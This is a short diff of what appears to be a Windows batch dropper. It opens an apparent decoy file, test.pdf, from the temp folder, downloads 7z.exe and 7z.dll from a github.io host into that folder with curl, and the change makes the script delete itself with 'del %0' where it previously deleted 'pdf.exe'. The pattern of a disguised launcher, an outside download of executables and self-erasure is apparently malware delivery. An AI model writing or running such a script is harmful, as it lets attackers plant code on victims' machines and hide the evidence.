@@ -5,4 +5,4 @@ rundll32 url.dll,FileProtocolHandler file:///%TEMP%\test.pdf
 curl https://kingdog2.github.io/7z.exe -o "%TEMP%\7z.exe"
 curl https://kingdog2.github.io/7z.dll -o "%TEMP%\7z.dll"
 
-del "pdf.exe"
+del %0
